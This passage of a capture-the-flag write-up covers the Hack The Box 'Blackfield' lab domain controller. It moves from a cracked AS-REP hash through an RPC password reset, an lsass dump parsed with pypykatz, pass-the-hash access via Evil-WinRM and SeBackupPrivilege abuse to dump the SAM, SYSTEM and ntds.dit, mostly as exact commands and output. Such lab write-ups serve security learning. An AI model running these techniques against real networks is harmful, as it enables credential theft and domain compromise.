$krb5asrep$23$support@BLACKFIELD:61bf10686930a2b0aca50bcffac8b69d$c43ad62686e2e8db97077af8263fae871825d8dd7a543647339ed165292afe82f396ed97f1caf631418041657c475d47bb1c2f302f2162519ff0a2cb7468e8753a04484e03d4ffa03fb223bfd58b46e892d4e5eceab7fb65a9792c1adc9a2c8c6e0f596f768a8d249a7bcd3fcaa87c754937e66366d928d4aaa7d0475933981a6803fddecff0ecd4a0dc1b3a3efa2d369430e61908d0ad6b5388ceb966e1f8632f6247c96ed22fdb89ca0ed75f2a99496539638571e1915fdfd214a482b9b20bbd62319891aea6ea747d29cc4b206fc97d5b9b2895ab2f8569dad6385f7d56db0998399f6154bf2235b0c0b21082:#00^BlackKnight
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD:61bf10686930a2b0ac...b21082
Time.Started.....: Sat Apr 27 04:33:58 2024, (29 secs)
Time.Estimated...: Sat Apr 27 04:34:27 2024, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   480.3 kH/s (0.79ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14336000/14344385 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14335488/14344385 (99.94%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: #1*6)0 -> #!hrvert
Hardware.Mon.#1..: Util: 50%

Started: Sat Apr 27 04:33:34 2024
Stopped: Sat Apr 27 04:34:29 2024
             
```

And the hash was cracked. 

Credentials - `support:#00^BlackKnight` 

I quickly checked if these credentials were valid using `crackmapexec` and whether I could get a shell using these credentials:

```python
┌──(darshan㉿kali)-[~]
└─$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~]
└─$ crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight

```

So, these creds do work with `smb` but they dont work with `winrm` which means that I can read the shares by using these credentials but not get a shell.

Looking at the `smb` shares using the above credentials. It looks like I’ve gained READ ONLY access to the `NETLOGON` and `SYSVOL` shares:

```python
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~]
└─$ smbmap -H 10.10.10.192 -u support -p '#00^BlackKnight'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.192:445        Name: 10.10.10.192              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
                                                                                                                                                                                                                                                            

┌──(darshan㉿kali)-[~]
└─$ psexec.py support:'#00^BlackKnight'@10.10.10.192
/usr/local/bin/psexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240304.182237.3ee3bb46', 'psexec.py')
Impacket v0.12.0.dev1+20240304.182237.3ee3bb46 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.192.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'forensic' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'profiles$' is not writable.
[-] share 'SYSVOL' is not writable.

```

Both the scripts returned similar results, so I could confirm that this is a dead end.

Moving on, I decided to check out if I could use these credentials for `LDAP`:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ ldapsearch -H ldap://10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
```

The results were over 20-thousand lines long:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ wc -l support_ldap_dump                                                                                                             
20362 support_ldap_dump                                                                                                                                                                                                                                                 
```

Now, I didnt find anything partcularly useful, but I did find the name of the domain controller, `DC01`:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ cat support_ldap_dump | grep -i "Domain Controller"
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
# Domain Controllers, BLACKFIELD.local
dn: OU=Domain Controllers,DC=BLACKFIELD,DC=local
ou: Domain Controllers
description: Default container for domain controllers
distinguishedName: OU=Domain Controllers,DC=BLACKFIELD,DC=local
name: Domain Controllers
displayName: Default Domain Controllers Policy
description: Members can administer printers installed on domain controllers

# DC01, Domain Controllers, BLACKFIELD.local

dn: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
distinguishedName: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
rIDSetReferences: CN=RID Set,CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=lo
...SNIP...
```

Now that I know what is  name of the `dc`  for `blackfield.local` , I can run `bloodhound` using `support` user’s credentials:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192          
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 25S
```

Importing this data in `Bloodhound` after starting the `Neo4j` console with the following command:

```python
sudo neo4j console
```

I loaded all the files into `Bloodhound`. In the top left, I searched for `support`, and checked out the node info. There was one item listed under `First Degree Object Control`:

![Untitled](BlackField%2000c98b268c534fbda623230b04ce7044/Untitled.png)

Now, I was unaware of how to abuse this attack vector. On googling about it, I found out that there’s a somewhat famous post by Mubix about [resetting Windows passwords over RPC](https://room362.com/post/2017/reset-ad-user-password-with-linux/). I’ll use the command `setuserinfo2`:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ rpcclient 10.10.10.192 -U 'support'                     
Password for [WORKGROUP\support]:

rpcclient $> setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER

rpcclient $> setuserinfo2 audit2020 23 'fak3r'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION

rpcclient $> setuserinfo2 audit2020 23 'fak3r!!!'

rpcclient $>
```

Now since it returned nothing, I guess the password has been set to `fak3r!!!`.

I’ll try using the same password and see if I can authenticate as the user `audit2020`:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'fak3r!!!'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:fak3r!!! 
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec winrm 10.10.10.192 -u 'audit2020' -p 'fak3r!!!'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\audit2020:fak3r!!!
                                                                                                                                                                                                                                                            
```

Similarly as the `support` user, I can access the `smb` shares but not get a shell.

So, now, I decided to check the `smb` shares once again, to see if I now had access to any of these shares:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ smbmap -H 10.10.10.192 -u audit2020 -p 'fak3r!!!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.192:445        Name: 10.10.10.192              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
                                                                                                                                                                                                                                                            
```

Okay, so I had read access to the `forensics` share with the `audit2020` account.

I’ll now try to extract all the files from the `forensics` share (if it is not empty) and check it out:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ smbclient -U audit2020 //10.10.10.192/forensic 'fak3r!!!'   
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \commands_output\domain_admins.txt of size 528 as commands_output/domain_admins.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \commands_output\domain_groups.txt of size 962 as commands_output/domain_groups.txt (1.9 KiloBytes/sec) (average 1.4 KiloBytes/sec)
getting file \commands_output\domain_users.txt of size 16454 as commands_output/domain_users.txt (31.9 KiloBytes/sec) (average 11.6 KiloBytes/sec)
getting file \commands_output\firewall_rules.txt of size 518202 as commands_output/firewall_rules.txt (279.1 KiloBytes/sec) (average 157.7 KiloBytes/sec)
getting file \commands_output\ipconfig.txt of size 1782 as commands_output/ipconfig.txt (3.4 KiloBytes/sec) (average 137.2 KiloBytes/sec)
getting file \commands_output\netstat.txt of size 3842 as commands_output/netstat.txt (7.4 KiloBytes/sec) (average 122.0 KiloBytes/sec)
getting file \commands_output\route.txt of size 3976 as commands_output/route.txt (7.7 KiloBytes/sec) (average 110.1 KiloBytes/sec)
getting file \commands_output\systeminfo.txt of size 4550 as commands_output/systeminfo.txt (8.9 KiloBytes/sec) (average 100.6 KiloBytes/sec)
getting file \commands_output\tasklist.txt of size 9990 as commands_output/tasklist.txt (19.4 KiloBytes/sec) (average 93.6 KiloBytes/sec)
parallel_read returned NT_STATUS_IO_TIMEOUT
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\ctfmon.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\dfsrs.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\dllhost.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\ismserv.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\lsass.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\mmc.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\RuntimeBroker.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\ServerManager.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\sihost.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\smartscreen.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\svchost.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\taskhostw.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\winlogon.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\wlms.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\WmiPrvSE.zip
NT_STATUS_CONNECTION_DISCONNECTED listing \memory_analysis\*
NT_STATUS_CONNECTION_DISCONNECTED listing \tools\*
smb: \> getting file \memory_analysis\conhost.zip of size 37876530 as memory_analysis/conhost.zip SMBecho failed (NT_STATUS_CONNECTION_DISCONNECTED). The connection is disconnected now

```

Although I got an error while downloading the files from `meomory_analysis` directory, I was able to download the files from the other directories.

Going through the downlaoded files, I  found something interesting:

```python
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/commands_output]
└─$ cat domain_admins.txt 
��Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator       Ipwn3dYourCompany     
The command completed successfully.

```

There’s an extra account, `Ipwn3dYourCompany`, in `domain_admins.txt`

Now, all the other files had network related information which I dont think was that important at this point

Now, I went back to check the `memory_analysis` folder which due to some reasons, I was unable to download:

```python
smb: \> ls memory_analysis\
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020

                7846143 blocks of size 4096. 3490514 blocks available

```

It had a ton of `zip` files and which intrested me was the `lsass.zip`.

So, I downloaded these files, unzip them to check out the contents in the file:

```python
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
└─$ unzip lsass.zip 
Archive:  lsass.zip
  inflating: lsass.DMP               
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
└─$ ls
conhost.zip  ctfmon.zip  dllhost.zip  ismserv.zip  lsass.DMP  lsass.zip  mmc.zip  ServerManager.zip  sihost.zip  smartscreen.zip  svchost.zip  taskhostw.zip  winlogon.zip  wlms.zip  WmiPrvSE.zip
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
└─$ file lsass.DMP 
lsass.DMP: Mini
```

I could move this over to a Windows VM, but there’s a Mimikatz alternative, [pypykatz](https://github.com/skelsec/pypykatz) which will work just fine. I’ll install it with `pip3 install pypykatz`. [This blog](https://en.hackndo.com/remote-lsass-dump-passwords/#linux--windows) has a good section on dumping with `pypykatz` from Linux. It dumps a bunch of information:

```python
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
└─$ pypykatz lsa minidump lsass.DMP 
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [5950b]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5950b]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
```

Looking at the output of the file, I found out that there was a login by the username `svc_backup`, other than that there was only one account used for logging in. So I was pretty sure that the next escalation would be to the `svc_backup` account. I was also able to retrieve the `NT` hash of the account. I’ll authenticate these credenntials with `crackmapexec`:

```python
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
└─$ crackmapexec smb 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
└─$ crackmapexec winrm 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)

```

WOW! Now unlike other it is possible to get a shell for this user.

I’ll get a shell using `Evil-WinRM`:

```python
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'            
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
```

Retrieving the `user` flag:

```python
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_backup> cd Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls

    Directory: C:\Users\svc_backup\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat user.txt
3920bb317a0bef51027e2852be64b543

```

Priv Esc - Enumeration

Checking out the privileges the user account `svc_backup` has:

```python
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

`SeBackUpPrivilege` basically allows for full system read. This is because `svc_backup` is in the Backup Operators group:

```python
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> net user svc_backup
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/27/2024 5:11:45 PM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

I found a post on `how to dump the local SAM hashes by abusing the SeBackupPrivilege`, which can be found **[here](https://juggernaut-sec.com/dumping-local-sam-file-hashes-with-sebackupprivilege/)**; I’ll try the same technique to see if I could dump the hashes:

To begin, I used the simple method of copying the `SAM` and `SYSTEM` from the post by using the following two commands:

```
reg save hklm\sam c:\temp\sam

reg save hklm\system c:\temp\system
```

To execute the above commands properly, i first created a `temp` directory in the `C:` drive, and then ran the commands:

```python
*Evil-WinRM* PS C:\> mkdir temp

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/28/2024   7:18 AM                temp

*Evil-WinRM* PS C:\> reg save hklm\sam c:\temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system c:\temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> ls

    Directory: C:\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/28/2024   7:18 AM          45056 sam
-a----        4/28/2024   7:18 AM       17580032 system

*Evil-WinRM* PS C:\temp> 

```

I’ll now download these files on my machine using the `download` command:

```python
*Evil-WinRM* PS C:\temp> download sam
                                        
Info: Downloading C:\temp\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system
                                        
Info: Downloading C:\temp\system to system

Info: Download successful!
Evil-WinRM* PS C:\temp>
```

Checking out if they were downloaded on my system and then checking out what type of files they were:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ ls        
...SNIP...   sam  ...SNIP...    system     ...SNIP...
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ file sam            
sam: MS Windows registry file, NT/2000 or above
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ file system
system: MS Windows registry file, NT/2000 or above
                                                                                                                                                                                                                                                            
```

Now, I’ll `[secretsdump.py](http://secretsdump.py)` to extract all the `SAM hashes`:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ secretsdump.py -sam sam -system system LOCAL
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240304.182237.3ee3bb46', 'secretsdump.py')
Impacket v0.12.0.dev1+20240304.182237.3ee3bb46 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

```

It dumped the hashes of the `Administrator.` I validate the hash using `crackmapexec`:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec winrm 10.10.10.192 -u administrator -H 67ef902eae0d740df6257f273de75051 --local-auth
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] DC01\administrator:67ef902eae0d740df6257f273de75051
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ crackmapexec winrm 10.10.10.192 -u administrator -H 67ef902eae0d740df6257f273de75051             
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\administrator:67ef902eae0d740df6257f273de75051
```

So, it seems that the hashes dont work. 

Now that the `SAM` hashes didn’t work, I’ll switch the focus to the **`ntds.dit`** file as that is the domain controller equivalent of the local SAM file.

Now, a good way to read the `ntds.dit` file is using [another Microsoft utility](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow), `diskshadow`:

Because my shell is not an interactive desktop, I’ll want to use the `scripting` mode. It involves just putting `diskshadow` commands in a file, one per line. Pentestlab Blog has a [good breakdown](https://pentestlab.blog/tag/diskshadow/) that includes a section on using `diskshadow`. It’s written as if you have admin and just have to deal with accessing the file, so my strategy will be slightly different.

I’m going to create a file that mounts the c drive as another drive using the `VSS`. I’ll be able to read files from there that would be locked in c.

I used the following commands directly on the victim machine to craft the diskshadow.txt file:

```

echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
```

Checking out if the commands were appended in the file perfectly:

```python
*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
*Evil-WinRM* PS C:\temp> echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
*Evil-WinRM* PS C:\temp> echo "create" | out-file ./diskshadow.txt -encoding ascii -append
*Evil-WinRM* PS C:\temp> echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
*Evil-WinRM* PS C:\temp> cat diskshadow.txt
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
```

After creating the diskshadow.txt file, I used the the following command to create a shadow copy and make it visible as the Z:\ drive:

```
